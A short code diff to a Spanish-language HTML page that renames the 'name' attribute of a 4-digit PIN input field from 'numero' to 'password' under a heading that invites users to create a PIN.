@@ -95,7 +95,7 @@
 			<br>
 			<h6>¿Olvidó su contraseña?</h6>
 			<h4>Para mayor seguridad cree un PIN a su cuenta</h4>
-			<input  id="pin" minlength="4" maxlength="4" type="password" type="password" name="numero" placeholder="PIN ****" required="" pattern="[0-9]+">
+			<input  id="pin" minlength="4" maxlength="4" type="password" type="password" name="password" placeholder="PIN ****" required="" pattern="[0-9]+">
 			<img id="llave" src="llave.svg" alt="llave.svg">
 			<br>
 			<br>
